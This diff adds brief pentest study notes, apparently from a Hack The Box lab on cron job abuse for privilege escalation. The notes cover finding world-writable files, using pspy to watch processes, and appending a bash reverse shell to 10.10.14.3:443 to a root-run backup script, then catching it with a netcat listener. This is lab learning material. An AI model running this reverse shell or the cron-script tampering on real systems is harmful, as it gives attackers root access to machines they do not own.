@@ -1,0 +1,31 @@
+Check /etc/cron.d directory 
+script to check cronjobs (proccesses, must check more for cron jobs)
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null 
+
+pspy is a command -line tool used to view running proccess without the need for root.
+
+https://github.com/DominicBreuker/pspy
+
+We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to ALWAYS take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.
+Cron Job Abuse
+
+E@htb[/htb]$ cat /dmz-backups/backup.sh 
+
+#!/bin/bash
+ SRCDIR="/var/www/html"
+ DESTDIR="/dmz-backups/"
+ FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+ tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+** edit script
+#!/bin/bash
+SRCDIR="/var/www/html"
+DESTDIR="/dmz-backups/"
+FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+ 
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+modify ip to our listner ip
+We modify the script, stand up a local netcat listener, and wait. Sure enough, within three minutes, we have a root shell!
+Cron Job Abuse
+
+Ehtb[/htb]$ nc -lnvp 443
